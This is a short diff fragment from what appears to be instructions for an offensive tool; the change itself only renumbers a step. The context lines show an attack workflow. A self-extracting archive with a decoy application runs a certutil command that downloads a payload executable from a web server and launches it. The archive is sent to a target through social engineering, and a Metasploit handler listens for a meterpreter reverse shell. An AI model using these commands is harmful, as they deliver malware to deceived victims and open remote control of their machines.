@@ -115,7 +115,7 @@
          script.bat (thats going to execute: any_file) => any_legit_appl.exe (to be executed as decoy)
          PRESETUP FUNTION => cmd.exe /c certutil -urlcache -split -f 'http://webserver/payload.exe', '%TEMP%/payload.exe'; Start-Process '%TEMP%/payload.exe'
 
-    6º - start a listenner, and send the sfx archive to target using social enginnering
+    5º - start a listenner, and send the sfx archive to target using social enginnering
          msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.1.69; set lport 666; exploit'
 
     ╔────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╗
